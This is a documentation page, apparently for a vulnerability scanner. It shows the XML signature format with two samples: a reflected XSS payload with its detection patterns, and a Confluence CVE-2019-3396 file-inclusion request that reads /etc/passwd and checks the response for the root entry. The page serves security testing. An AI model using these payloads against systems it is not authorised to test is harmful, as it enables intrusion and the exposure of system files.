---
title: "Signatures"
date: 2019-07-31T12:51:40+07:00
draft: false
---

![signatures](screenshots/ext-1.png?classes=border,shadow)
<h4 align="center">Easy to extend signatures</h4>

***

#### Normal Signature

```xml
<?xml version="1.0" encoding="UTF-8"?>
<PayloadConfigList>

  <PayloadConfig>
    <AttackPayload>
      <Id>XSS_01_1</Id>
      <PayloadName>XSS event base</PayloadName>
      <PayloadType>XSS</PayloadType>
      <OS>General</OS>
      <Technology>General</Technology>
      <Vulnerability>Cross Site Scripting (XSS)</Vulnerability>
      <Description>Event based</Description>
      <Risk>High</Risk>
      <PayloadString>
        <![CDATA[%ORIGINAL%'"><svg/onload=alert(%RANNUM%)>]]>
      </PayloadString>
    </AttackPayload>

    <AnalyzeList>
      <Analyze type="string">
        <AnalyzeString>
          <![CDATA[<svg/onload=alert(>]]>
        </AnalyzeString>
        <AnalyzeComponent>General</AnalyzeComponent>
        <Confidence>Tentative</Confidence>
      </Analyze>
    </AnalyzeList>

    <AnalyzeList>
      <Analyze type="regex">
        <AnalyzeString>
          <![CDATA[\<svg\/onload\=alert\(.*]]>
        </AnalyzeString>
        <AnalyzeComponent>General</AnalyzeComponent>
        <Confidence>Tentative</Confidence>
      </Analyze>
    </AnalyzeList>

  </PayloadConfig>

    <PayloadConfig>
        ...
    </PayloadConfig>
  
</PayloadConfigList>

```

***

#### Special Signature

```xml
<?xml version="1.0" encoding="UTF-8"?>
<PayloadConfigList>

  <PayloadConfig>
    <AttackPayload>
      <Id>CVE_01_1</Id>
      <PayloadName>Confluence CVE-2019-3396</PayloadName>
      <PayloadType>CVE</PayloadType>
      <OS>General</OS>
      <Technology>Jira Confluence</Technology>
      <Vulnerability>File Inclusion</Vulnerability>
      <Description>Confluence CVE-2019-3396</Description>
      <Risk>Critical</Risk>
      <PayloadString>
        <![CDATA[%HEADER@Content-Type%|application/xml]]>
      </PayloadString>
      <PayloadString>
        <![CDATA[%BODY%|{"contentId":"1","macro":{"name":"widget","params":{"url":"https://www.viddler.com/v/test","width":"1000","height":"1000","_template":"file:///etc/passwd"},"body":""}}]]>
      </PayloadString>
    </AttackPayload>

    <AnalyzeList>
        <Analyze type="string">
            <AnalyzeString>
                <![CDATA[root:x:0:0:root]]>
            </AnalyzeString>
            <AnalyzeComponent>General</AnalyzeComponent>
            <Confidence>Tentative</Confidence>
        </Analyze>
    </AnalyzeList>

    <AnalyzeList>
        <Analyze type="string">
            <AnalyzeString>
                <![CDATA[/bin/bash]]>
            </AnalyzeString>
            <AnalyzeComponent>General</AnalyzeComponent>
            <Confidence>Tentative</Confidence>
        </Analyze>
    </AnalyzeList>

  </PayloadConfig>
  
</PayloadConfigList>

```